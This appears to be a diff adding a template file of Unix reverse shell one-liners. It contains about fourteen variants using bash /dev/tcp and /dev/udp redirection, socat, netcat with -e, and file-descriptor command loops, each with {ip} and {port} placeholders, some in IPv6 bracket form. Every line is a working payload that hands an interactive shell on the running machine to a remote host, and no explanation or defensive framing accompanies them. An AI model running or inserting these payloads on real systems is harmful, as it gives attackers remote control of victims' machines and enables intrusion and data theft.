@@ -1,0 +1,27 @@
+bash -i >& /dev/tcp/{ip}/{port} 0>&1
+
+0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196
+
+/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1
+
+sh -i >& /dev/udp/{ip}/{port} 0>&1
+
+/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}
+
+bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'
+
+exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done
+
+exec 5<>/dev/tcp/{ip}/{port}; while read line <&5; do $line 2>&5 >&5; done
+
+while true; do nc -e /bin/sh {ip} {port}; done
+
+exec 5<>/dev/tcp/{ip}/{port}; while true; do read cmd <&5; $cmd >&5 2>&5; done
+
+exec 5<>/dev/tcp/[{ip}]/{port};cat <&5 | while read line; do $line 2>&5 >&5; done
+
+exec 5<>/dev/tcp/[{ip}]/{port}; while read line <&5; do $line 2>&5 >&5; done
+
+while true; do nc -e /bin/sh [{ip}] {port}; done
+
+exec 5<>/dev/tcp/[{ip}]/{port}; while true; do read cmd <&5; $cmd >&5 2>&5; done
